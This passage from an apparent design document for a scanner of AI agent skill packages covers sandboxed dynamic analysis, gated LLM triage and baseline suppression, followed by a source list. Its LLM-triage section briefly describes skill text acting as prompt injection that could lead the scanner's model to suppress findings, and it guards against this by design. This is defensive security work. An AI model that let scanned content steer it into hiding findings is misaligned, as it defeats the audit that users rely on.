- FN implications: unknown malicious packages need heuristics +
  benchmark, not OSV alone.
- Priority: P2.

### R10. Sandboxed dynamic analysis (architecture now, build later)
- Problem: runtime-decoded payloads and install-time behavior are
  invisible statically.
- Evidence: DySec (95.99% accuracy, 11 packages PyPI missed);
  Snyk's own sandbox warning; CSA recommendation of behavioral
  sandboxing.
- Solution: separate opt-in binary, bubblewrap + seccomp + network
  namespace, telemetry to the existing finding schema, findings
  labeled "observed in sandbox".
- Benefit: closes the runtime gap; the verified-badge story gains
  behavioral evidence.
- Complexity: high; deferred.
- Security implications: the sandbox must be a real boundary; a
  leaky sandbox is a liability. Linux-only v1.
- FP implications: sandbox telemetry is ground truth for that run;
  low FP.
- FN implications: logic bombs and semantic attacks still missed;
  sandbox is additive.
- Priority: P3 (architected in v2, built when the telemetry schema
  is exercised).

### R11. Gated LLM triage (optional, labeled, non-authoritative)
- Problem: semantic gaps (SCH, compliance-rule phrasings) exceed
  deterministic reach; naive LLM use is nondeterministic and
  injectable.
- Evidence: 2606.23416 locate-then-judge (order-of-magnitude cost
  cut, dominates regex baselines); 2601.06838 CHASE (98.4% recall /
  0.08% FPR with deterministic tools); Cisco ships LLM-as-judge.
- Solution: deterministic locator defines a small review queue;
  LLM proposes classification with model/version/prompt pinned;
  never suppresses deterministic findings; offline-degrading;
  cost-capped.
- Benefit: semantic coverage without sacrificing determinism or
  auditability.
- Complexity: medium (integration), low (model calls).
- Security implications: skill text is adversarial input to the
  scanner's own pipeline (P7); the LLM must be structurally unable
  to suppress findings.
- FP implications: LLM output lives in a separate labeled section.
- FN implications: deterministic findings unchanged.
- Priority: P3.

### R12. Baseline fingerprints and threshold profiles
- Problem: suppression is either absent or silent; FPR is not
  audience-tunable.
- Evidence: detect-secrets baseline pattern; One Detector Fits All
  (0.1% vs 10% FPR profiles).
- Solution: --baseline / --baseline-check fingerprint records;
  registry-publisher and enterprise-review severity profiles.
- Benefit: honest, reversible suppression; per-audience calibration.
- Complexity: low.
- Security implications: baseline drift is a re-review trigger
  (rug-pull defense), not a mute button.
- FP implications: baselines must record reason + fingerprint.
- FN implications: a stale baseline can hide changes; drift check
  is mandatory.
- Priority: P4.

---

## Appendix A. Sources

Verified during this research (2026-08-08):

Papers (arXiv, abstracts fetched via export API):
- 2605.11418, 2605.14460, 2604.03081, 2606.07131, 2606.23416,
  2605.09594, 2607.01456, 2602.06547 (cited via CSA), 2602.08412,
  2302.12173, 2310.12815, 2406.13352, 2410.02644, 2407.12784,
  2411.07781, 2402.07867, 2306.05499, 2501.15145, 2510.23673,
  2407.19354, 2310.09571, 2512.04338, 2503.00324, 2601.06838,
  2403.14720, 2505.06311.

Incidents and vendor research:
- CSA research note "Poisoned Skills" (2026-06-24),
  labs.cloudsecurityalliance.org.
- Microsoft Security Blog "Securing AI agents" (2026-06-30).
- HiddenLayer "The Next AI Supply Chain Risk" (2026-06-11).
- Wiz and CISA advisories for tj-actions CVE-2025-30066 and
  reviewdog CVE-2025-30154 (2025-03).
- NVIDIA SkillSpector (github.com/nvidia/skillspector); Cisco Skill
  Scanner (github.com/cisco-ai-defense/skill-scanner).
- Semgrep taint-mode documentation (semgrep.dev/docs).
- OpenSSF Scorecard (securityscorecards.dev).
- OSV-Scanner (google.github.io/osv-scanner).
- agentskills.io specification.
- Invariant Labs MCP tool-poisoning notification (Apr 2025).
- TruffleHog v3 announcement.

Project-internal evidence:
- scanaskill 0.8.0 source and tests (~/M/ideas/scanaskill).
- Live scans: ~/.hermes/skills (182 skills, 7,810 findings),
  agentscan-registry (656, 104), agentscan-site (15, 870), scanner
  repo itself (7, 263).
- CORPUS-REPORT.md (4,000-skill sample, seed 42).
